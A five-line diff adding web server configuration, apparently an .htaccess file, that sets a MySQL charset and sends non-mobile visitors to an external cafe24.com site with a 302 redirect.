@@ -1,0 +1,5 @@
+PHP_VALUE mysql.default_charset UTF8
+
+RewriteEngine On
+RewriteCond %{HTTP_USER_AGENT} !(android|blackberry|googlebot-mobile|iemobile|iphone|ipod|opera\smobile|palmos|webos) [NC]
+RewriteRule ^ https://seyecenter2.cafe24.com [L,R=302] 
